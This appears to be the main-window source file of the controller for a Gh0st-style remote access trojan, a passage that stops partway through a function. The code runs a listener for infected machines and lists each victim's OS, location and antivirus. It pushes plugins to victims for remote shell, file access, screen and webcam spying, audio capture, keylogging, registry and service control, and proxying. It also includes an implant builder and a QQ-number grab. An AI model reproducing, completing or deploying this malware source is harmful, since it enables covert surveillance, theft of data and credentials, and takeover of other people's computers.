// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Client.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "PcView.h"
#include "SettingDlg.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "ShellDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "LocalUpload.h"
#include "KeyBoardDlg.h"
#include "ServiceDlg.h"
#include "RegeditDlg.h"
#include "TextChatDlg.h"
#include "ProxyMapDlg.h"
#include "LogView.h"
#include "Mydat.h"
#include "Dialogbar.h"

#include "..\DLL\Plugins\C_FILE.h"
#include "..\DLL\Plugins\C_SHELL.h"
#include "..\DLL\Plugins\C_SCREEN.h"
#include "..\DLL\Plugins\C_VIDEO.h"
#include "..\DLL\Plugins\C_LISTEN.h"
#include "..\DLL\Plugins\C_SYSTEM.h"
#include "..\DLL\Plugins\C_KEYLOG.h"
#include "..\DLL\Plugins\C_SERVICE.h"
#include "..\DLL\Plugins\C_REGEDIT.h"
#include "..\DLL\Plugins\C_CHAT.h"
#include "..\DLL\Plugins\C_PROXYMAP.h"


#define WM_SYSTRAY						WM_USER+100
#define WM_ICONMESSAGE					WM_USER+100

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CMainFrame	*g_pFrame;
CIOCPServer * m_iocpServer = NULL;
extern CClientView* g_pTabView; 
extern HMODULE hModule_shell32;
extern CLogView* g_pLogView;
extern CDialogbar * pInfoMation;


LPBYTE lpFilePacket = NULL;
LPBYTE lpShellPacket = NULL;
LPBYTE lpScreenPacket = NULL;
LPBYTE lpWebCamPacket = NULL;
LPBYTE lpAudioPacket = NULL;
LPBYTE lpSystemPacket = NULL;
LPBYTE lpKeyboardPacket = NULL;
LPBYTE lpServicePacket = NULL;
LPBYTE lpRegeditPacket = NULL;
LPBYTE lpTextChatPacket = NULL;
LPBYTE lpProxyMapPacket = NULL;
int nFilePacketLength = 0;
int nShellPacketLength = 0;
int nScreenPacketLength = 0;
int nWebCamPacketLength = 0;
int nAudioPacketLength = 0;
int nSystemPacketLength = 0;
int nKeyboardPacketLength = 0;
int nServicePacketLength = 0;
int nRegeditPacketLength = 0;
int nTextChatPacketLength = 0;
int nProxyPacketLength = 0;



/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CXTPFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CXTPFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_SYSCOMMAND()
	ON_COMMAND(ID_MENUITEM_SHOW, OnMenuitemShow)
	ON_COMMAND(ID_MENUITEM_HIDE, OnMenuitemHide)
	ON_WM_CLOSE()
	ON_WM_TIMER()
	ON_COMMAND(ID_MENUITEM_SETTING, OnMenuitemSetting)
	ON_COMMAND(ID_MENUITEM_BUILD, OnMenuitemBuild)
	ON_WM_TIMER()
	ON_WM_SYSCOMMAND()
	//}}AFX_MSG_MAP
	//ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
    ON_MESSAGE(WM_OPENBUILDDIALOG, OnOpenBuildDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServiceDialog)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
	ON_MESSAGE(WM_OPENTEXTCHATDIALOG, OnOpenTextChatDialog)
	ON_MESSAGE(WM_OPENPROXYMAPDIALOG, OnOpenProxyMapDialog) 
	ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)	
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_MESSAGE(WM_OPENTEMPSYSINFO, OnOpenTempSysInfoDialog)
    END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTS_OS,	// 主机统计
	ID_STAUTSSPEED,	// 上传下载速度
	ID_STAUTS_PORT,
	ID_INDICATOR_CAPS,
	ID_INDICATOR_NUM,
	ID_INDICATOR_SCRL,


};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
    memset(nOSCount,0,sizeof(nOSCount)); 
}

CMainFrame::~CMainFrame()
{
}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	//界面居中显示
	this ->CenterWindow(CWnd::GetDesktopWindow());
	
	// 初始化 command bars
	if (!InitCommandBars())
		return -1;
	
	// 获取 command bars 目标 指针
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}
	
	if (!m_TrayIcon.Create(_T("连接: 0"), // Toolktip text  添加系统托盘
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MENU_TRAY,             // Resource ID of popup menu
		ID_MENUITEM_SHOW ,               // Default menu item for popup menu
		false
		))                     // True if default menu item is located by position
	{
		TRACE0("Failed to create tray icon\n");
		return -1;
	}
   	//SetMenu(NULL);//去除菜单
//////////////////////////////////////////////////////////
	// CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("主工具栏"), xtpBarTop);
	// if (!pCommandBar ||
	// 	!pCommandBar->LoadToolBar(IDR_TOOLBAR3))
	// {
	// 	TRACE0("Failed to create toolbar\n");
	// 	return -1;
	// }
	// CImageList m_imagelist;
	// m_imagelist.Create(24,24,ILC_COLOR24|ILC_MASK,0,0);
    // CBitmap bmp;
	// bmp.LoadBitmap(IDB_TOOLBAR);
	// m_imagelist.Add(&bmp,RGB(255,255,255));
	// CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();
	// pOptions->bShowExpandButtonAlways = FALSE;
	// pOptions->bShowTextBelowIcons = TRUE;
	// pOptions->bLargeIcons = FALSE;
	// pCommandBar->ModifyBarStyle(CBRS_GRIPPER,0);
	// pCommandBar->EnableDocking(xtpFlagStretched);
	// pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,m_imagelist);
	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 

// 

	
	// 添加状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	
	//设置下面状态栏
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 200);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);

	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowWindowsDefault);
	XTPColorManager()->DisableLunaColors(TRUE);
	pCommandBars->SetTheme(xtpThemeNativeWinXP); //工具栏
	
	CXTPPaintManager::SetTheme(xtpThemeOffice2003); //设置日志对话框主题
	CXTPPaintManager::SetTheme(xtpThemeOffice2003); //设置日志对话框主题
	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005);
	// 	// 加载之前的工具栏和菜单。
	// 	LoadCommandBars(_T("CommandBars"));
// 	SetTimer(0, 1000, NULL);  //开启定时器 1

    	CXTPDockingPane* pwndPaneLog = CreatePane(235, 100, RUNTIME_CLASS(CLogView), _T("信息"), xtpPaneDockBottom);
	 	pwndPaneLog->Select();
	 	pwndPaneLog->SetOptions(xtpPaneNoCaption);
	 	m_paneManager.ShowPane(pwndPaneLog, 1);	
// 		// 初始化插件内存
//direction parameter can be one of the following: 

// ?xtpPaneDockTop: Docks the pane to the top of the neighbor.
// ?xtpPaneDockLeft: Docks the pane to the left of the neighbor.
// ?xtpPaneDockRight: Docks the pane to the right of the neighbor.
// ?xtpPaneDockBottom: Docks the pane to the bottom of the neighbor.
	
		// File
		nFilePacketLength = (FILEMyFileSize + 1)*sizeof(char)+1;
		lpFilePacket = new BYTE[nFilePacketLength];
		if(lpFilePacket == NULL)
		{
			AfxMessageBox("初始化File插件失败！");
		}
		else
		{
			lpFilePacket[0] = COMMAND_LIST_DRIVE;
			memcpy(lpFilePacket + 1, (void*)FILEMyFileBuf, nFilePacketLength - 1);
		}
	
		// Shell
		nShellPacketLength = (SHELLMyFileSize + 1)*sizeof(char)+1;
		lpShellPacket = new BYTE[nShellPacketLength];
		if(lpShellPacket == NULL)
		{
			AfxMessageBox("初始化shell插件失败！");
		}
		else
		{
			lpShellPacket[0] = COMMAND_SHELL;
			memcpy(lpShellPacket + 1, (void*)SHELLMyFileBuf, nShellPacketLength - 1);
		}

	// 屏幕
	nScreenPacketLength = (SCREENMyFileSize + 1)*sizeof(char)+1;
	lpScreenPacket = new BYTE[nScreenPacketLength];
	if(lpScreenPacket == NULL)
	{
		AfxMessageBox("初始化Screen插件失败！");
	}
	else
	{
 		lpScreenPacket[0] = COMMAND_SCREEN_SPY;
    	memcpy(lpScreenPacket + 1, (void*)SCREENMyFileBuf, nScreenPacketLength - 1);
	}

	// webcam
	nWebCamPacketLength = (VIDEOMyFileSize + 1)*sizeof(char)+1;
	lpWebCamPacket = new BYTE[nWebCamPacketLength];
	if(lpWebCamPacket == NULL)
	{
		AfxMessageBox("初始化WebCam插件失败！");
	}
	else
	{
		lpWebCamPacket[0] = COMMAND_WEBCAM;
		memcpy(lpWebCamPacket + 1, (void*)VIDEOMyFileBuf, nWebCamPacketLength - 1);
	}

	// Audio
	nAudioPacketLength = (LISTENMyFileSize + 1)*sizeof(char)+1;
	lpAudioPacket = new BYTE[nAudioPacketLength];
	if(lpAudioPacket == NULL)
	{
		AfxMessageBox("初始化Audio插件失败！");
	}
	else
	{
		lpAudioPacket[0] = COMMAND_AUDIO;
		memcpy(lpAudioPacket + 1, (void*)LISTENMyFileBuf, nAudioPacketLength - 1);
	}

	// System
	nSystemPacketLength = (SYSTEMMyFileSize + 1)*sizeof(char)+1;
	lpSystemPacket = new BYTE[nSystemPacketLength];
	if(lpSystemPacket == NULL)
	{
		AfxMessageBox("初始化System插件失败！");
	}
	else
	{
		lpSystemPacket[0] = COMMAND_SYSTEM;
		memcpy(lpSystemPacket + 1, (void*)SYSTEMMyFileBuf, nSystemPacketLength - 1);
	}



	// Service
	nServicePacketLength = (SERVICEMyFileSize + 1)*sizeof(char)+1;
	lpServicePacket = new BYTE[nServicePacketLength];
	if(lpServicePacket == NULL)
	{
		AfxMessageBox("初始化Service插件失败！");
	}
	else
	{
		lpServicePacket[0] = COMMAND_SERVICE_MANAGER;
		memcpy(lpServicePacket + 1, (void*)SERVICEMyFileBuf, nServicePacketLength - 1);
	}

	// Regedit
	nRegeditPacketLength = (REGEDITMyFileSize + 1)*sizeof(char)+1;
	lpRegeditPacket = new BYTE[nRegeditPacketLength];
	if(lpRegeditPacket == NULL)
	{
		AfxMessageBox("初始化Regedit插件失败！");
	}
	else
	{
		lpRegeditPacket[0] = COMMAND_REGEDIT;
		memcpy(lpRegeditPacket + 1, (void*)REGEDITMyFileBuf, nRegeditPacketLength - 1);
	}


	// TextChat
	nTextChatPacketLength = (CHATMyFileSize + 1)*sizeof(char)+1;
	lpTextChatPacket = new BYTE[nTextChatPacketLength];
	if(lpTextChatPacket == NULL)
	{
		AfxMessageBox("初始化TextChat插件失败！");
	}
	else
	{
		lpTextChatPacket[0] = COMMAND_TEXT_CHAT;
		memcpy(lpTextChatPacket + 1, (void*)CHATMyFileBuf, nTextChatPacketLength - 1);
	}


	// ProxyMap
	nProxyPacketLength = (PROXYMAPMyFileSize + 1)*sizeof(char)+1;
	lpProxyMapPacket = new BYTE[nProxyPacketLength];
	if(lpProxyMapPacket == NULL)
	{
		AfxMessageBox("初始化ProxyMap插件失败！");
	}
	else
	{
		lpProxyMapPacket[0] = COMMAND_PROXY_MAP;
    	memcpy(lpProxyMapPacket + 1, (void*)PROXYMAPMyFileBuf, nProxyPacketLength - 1);
	}

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CXTPFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.lpszClass = _T("XTPMainFrame");
	CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass, 
		CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));
	cs.cx =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("CLIENT", "Width",  1210);
	cs.cy =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("CLIENT", "Hight",  500);
	
	cs.dwExStyle&=~WS_EX_CLIENTEDGE;
	cs.style &= ~FWS_ADDTOTITLE;
	// 主窗口标题
	cs.lpszName = _T("请稍等连接中。。。");

	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CXTPFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CXTPFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers
//void CMainFrame::OnPopup() {}

// 激活监听服务
void CMainFrame::Activate(int nPort, int nMaxConnections)
{
	//判断这个m_iocpServer全局变量是否已经指向了一个CIOCPServer
	if (m_iocpServer != NULL)
	{
		//，如果是的话，就要先关闭它，并且删除掉这个CIOCPServer所占的内存空间
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;
	// 开始心跳
	m_iocpServer->m_nHeartBeatTime = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "HeartBeatTime", 0);

	CString str,IP,strLogText;
	str.Format("注意！请合理学习使用");
	g_pLogView->InsertLogItem( str, 0, 0 );

	// 开启IPCP服务器
 	if (m_iocpServer->Initialize(NotifyProc, nMaxConnections, nPort))
 	{

		char hostname[256]; 
		memset(hostname,0,256);
 		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
			
		if (host != NULL)
		{
			for ( int i=0; ; i++ )
			{ 
				IP += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				IP += "/";
			}
		}	
		else
			IP = _T("127.0.0.1");

		str.Format("端口:%d",nPort);
	    m_wndStatusBar.SetPaneText(2, str);
		strLogText.Format( "端口: [ %d ]  成功", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 4 );

 	}
	else
	{
		IP.Format(_T("端口 %d 监听失败"), nPort);
		UpdateWindow();

		m_wndStatusBar.SetPaneText(2, "端口:0");
		strLogText.Format( "端口: [ %d ]  失败", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 5 );
	}

	
    SetWindowText("CK安全网课件  www.ckhack.com");
 	m_wndStatusBar.SetPaneText(0, _T("连接: 0"));
}

void CALLBACK CMainFrame::NotifyProc( ClientContext *pContext, UINT nCode )
{
	switch (nCode)
	{
	case NC_CLIENT_CONNECT:
		break;
	case NC_CLIENT_DISCONNECT:
		g_pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
		break;
	case NC_TRANSMIT:
		break;
	case NC_RECEIVE:
		ProcessReceive(pContext);
		break;
	case NC_RECEIVE_COMPLETE:
		ProcessReceiveComplete(pContext);
		break;
	default:
		break;
	}
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVICE_DLG:
			((CServiceDlg *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:
			((CRegeditDlg *)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG:
			((CTextChatDlg *)dlg)->OnReceiveComplete();
			break;
		case PROXYMAP_DLG:
	    	((CProxyMapDlg *)dlg)->OnReceiveComplete();
			break;
		case GETDAT_DLG:
			((CMydat *)dlg)->OnReceiveComplete();//附加功能
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_LOGIN: // 上线包
		{
			pContext->m_bIsMainSocket = TRUE;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
		}
		break;
	case TOKEN_DRIVE_LIST: // 文件管理 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: // 屏幕查看
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START: //开始CMD
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:     // 系统管理 进程列表
		g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_FIND_YES: // 筛选存在
		g_pFrame->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_DLLINFO:
		g_pFrame->PostMessage(WM_OPENBUILDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SERVICE_LIST:
		g_pFrame->PostMessage(WM_OPENSERVICEDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:   //注册表管理    
		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_TEXTCHAT_START:
		g_pFrame->PostMessage(WM_OPENTEXTCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START:
		g_pFrame->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CHAT_START:
		g_pFrame->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_GETQQNUM:
		g_pFrame->PostMessage(WM_WRITEQQNUM, 0, (LPARAM)pContext);
		break;
	case TOKEN_TEMP_SYSINFOLIST:
		g_pFrame->PostMessage(WM_OPENTEMPSYSINFO, 0, (LPARAM)pContext);
	default:
		closesocket(pContext->m_Socket);
		break;


	}	
}


// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{	
	m_TrayIcon.ShowBalloonTip( lpszText, _T("新上线主机信息: "), NIIF_INFO, 10);
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;

	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}

	strTemp.Format(_T("合计: %d"), a);

	str.Format(_T("Else:%d	2k:%d	XP:%d	2k3:%d	Vista:%d	2k8:%d	W7:%d	W8:%d	2k12:%d	W10:%d	2k16:%d	  %s"), 
		nOSCount[0],
		nOSCount[1], 
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8],
		nOSCount[9],
		nOSCount[10],
		strTemp);

	m_wndStatusBar.SetPaneText(0, str);

	UpdateData(); 

	g_pFrame->m_TrayIcon.SetTooltipText(strTemp);
}

void CMainFrame::OnCustomize()
{
	// get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if (pCommandBars == NULL)
		return;
	
	// instanciate the customize dialog
	CXTPCustomizeSheet dlg(pCommandBars);
	
	// add the options page to the customize dialog.
	CXTPCustomizeOptionsPage pageOptions(&dlg);
	dlg.AddPage(&pageOptions);
	
	// add the commands page to the customize dialog.
	CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
	pPageCommands->AddCategories(IDR_MAINFRAME);
	
	// initialize the commands page page.
	pPageCommands->InsertAllCommandsCategory();
	pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
	pPageCommands->InsertNewMenuCategory();
	
	// display the customize dialog.
	dlg.DoModal();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		m_TrayIcon.MinimizeToTray(this);
		m_TrayIcon.ShowBalloonTip( _T("程序最小化运行中......"), _T(" GHOST极速版 "), NIIF_NONE, 10);
	}
	else
	{
		CXTPFrameWnd::OnSysCommand(nID, lParam);
	}
}

void CMainFrame::OnMenuitemShow() 
{
	// TODO: Add your command handler code here
	if (!IsWindowVisible()){
        m_TrayIcon.MaximizeFromTray(this);
	}else
		m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnMenuitemHide() 
{
	// TODO: Add your command handler code here
	m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
#ifdef NDEBUG
	if (MessageBox(_T("确定退出?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
 		return;
#endif

	KillTimer(0);  //关闭定时器 

	RECT rect;
	::GetWindowRect(GetSafeHwnd(),&rect);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("CLIENT", "Width",  rect.right - rect.left);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("CLIENT", "Hight",  rect.bottom - rect.top);
	

	SaveCommandBars("CommandBars");

	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	pMainFrame->m_TrayIcon.RemoveIcon();
	
	if (NULL!=m_iocpServer)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}

	if (hModule_shell32)
	{
		FreeLibrary(hModule_shell32);
	}

	if (lpFilePacket)
	{
		delete [] lpFilePacket;
	}
	if (lpShellPacket)
	{
		delete [] lpShellPacket;
	}
	if (lpScreenPacket)
	{
		delete [] lpScreenPacket;
	}
	if (lpWebCamPacket)
	{
		delete [] lpWebCamPacket;
	}
	if (lpAudioPacket)
	{
		delete [] lpAudioPacket;
	}
	if (lpSystemPacket)
	{
		delete [] lpSystemPacket;
	}
	if (lpKeyboardPacket)
	{
		delete [] lpKeyboardPacket;
	}
	if (lpServicePacket)
	{
		delete [] lpServicePacket;
	}
	if (lpRegeditPacket)
	{
		delete [] lpRegeditPacket;
	}
	if (lpTextChatPacket)
	{
		delete [] lpTextChatPacket;
	}
	if (lpProxyMapPacket)
	{
		delete [] lpProxyMapPacket;
	}

	CXTPFrameWnd::OnClose();
}


void CMainFrame::OnMenuitemSetting() 
{
	// TODO: Add your command handler code here
	CSettingDlg dlg;
	dlg.DoModal();
}

void CMainFrame::OnMenuitemBuild() 
{
	// TODO: Add your command handler code here
	CBuildDlg dlg;
	dlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	
	CPcView* pView = NULL;
	CString strOSCount,strLogText;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	bool bIsOk = false;
	
	// 	try
	// 	{
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		// 删除链表过程中可能会删除pContext (所以不能使用pContext里的数据，说话说一半) 
		
		int nCnt = pView->m_pListCtrl->GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
			{
				bIsOk = true;
				strLogText.Format( "下线断开: [%s]  -   系统:[%s]  -   地理位置:[%s]  -   杀毒软件:[%s]",pView->m_pListCtrl->GetItemText(i, 1),pView->m_pListCtrl->GetItemText(i, 4),pView->m_pListCtrl->GetItemText(i, 0),pView->m_pListCtrl->GetItemText(i, 11));
				g_pLogView->InsertLogItem(strLogText, 0, 2);

				strOSCount = pView->m_pListCtrl->GetItemText( i, 4 );
				if ( strOSCount.Find(_T("NT")) != -1 )
				{
					g_pFrame->nOSCount[0]--;
				}
				if ( strOSCount.Find(_T("XP")) != -1 )
				{
					g_pFrame->nOSCount[2]--;
				}
				if ( strOSCount.Find(_T("Vista")) != -1 )
				{
					g_pFrame->nOSCount[4]--;
				}
				if ( strOSCount.Find(_T("Win 7")) != -1 )
				{
					g_pFrame->nOSCount[6]--;
				}
				if ( strOSCount.Find(_T("2000")) != -1 )
				{
					g_pFrame->nOSCount[1]--;
				}
				if ( strOSCount.Find(_T("2003")) != -1 )
				{
					g_pFrame->nOSCount[3]--;
				}
				if ( strOSCount.Find(_T("2008")) != -1 )
				{
					g_pFrame->nOSCount[5]--;
				}
				if ( strOSCount.Find(_T("Win 8")) != -1 )
				{
					g_pFrame->nOSCount[7]--;
				}
				if ( strOSCount.Find(_T("2012")) != -1 )
				{
					g_pFrame->nOSCount[8]--;
				}
				if ( strOSCount.Find(_T("Win 10")) != -1 )
				{
					g_pFrame->nOSCount[9]--;
				}
				if ( strOSCount.Find(_T("2016")) != -1 )
				{
					g_pFrame->nOSCount[10]--;
				}
				
				pView->m_pListCtrl->DeleteItem(i);
				
//				if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
//				{
//					PlaySound(MAKEINTRESOURCE(IDR_WAVE_OFFLINE),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
// 				}
				break;		
			}
		}		
	}

		if(bIsOk == false)
			TRACE("没有找到要删除的主机\r\n");

		// 关闭相关窗口
		switch (pContext->m_Dialog[0])
		{ 
		case FILEMANAGER_DLG:
		case SCREENSPY_DLG:
		case SHELL_DLG:
		case WEBCAM_DLG:
		case AUDIO_DLG:
		case SYSTEM_DLG:
		case KEYBOARD_DLG:
		case SERVICE_DLG:
		case REGEDIT_DLG:
		case CHAT_DLG:
		case PROXYMAP_DLG:
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
			return 0;
		default:
			break;
		}
 		
	// 	}
	// 	catch(...)
	// 	{
	// 		TRACE("下线删除catch\r\n");
	// 	}
	
	// 更新当前连接总数
	g_pTabView->UpDateNumber();
	ShowConnectionsNumber();
	
	return 0;
}

LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_SCREENSPY, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
	

	pContext->m_Dialog[0] = SCREENSPY_DLG;
